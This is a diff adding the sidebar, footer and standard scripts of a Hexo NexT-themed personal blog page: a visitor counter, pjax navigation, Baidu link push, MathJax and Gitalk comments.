+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">151</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">78</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : '4ac00cfcf5948f27e9bf8b01aa6dfa73',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
